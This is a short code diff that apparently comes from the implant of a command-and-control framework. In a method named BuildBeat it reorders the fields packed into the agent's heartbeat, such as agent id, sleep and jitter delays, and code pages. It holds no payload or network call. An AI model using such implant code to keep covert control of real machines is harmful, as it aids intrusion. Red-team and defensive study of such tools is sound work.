@@ -30,13 +30,13 @@ LPSTR Agent::BuildBeat()
 	flag <<= 1;
 	flag += this->info->arch64;
 
-	Packer* packer = (Packer*)MemAllocLocal(sizeof(Packer));
+	Packer* packer = (Packer*) MemAllocLocal(sizeof(Packer));
 	*packer = Packer();
 	
 	packer->Add32(this->config->agent_type);
+	packer->Add32(this->info->agent_id);
 	packer->Add32(this->config->sleep_delay);
 	packer->Add32(this->config->jitter_delay);
-	packer->Add32(this->info->agent_id);
 	packer->Add16(this->info->acp);
 	packer->Add16(this->info->oemcp);
 	packer->Add8(this->info->gmt_offest);
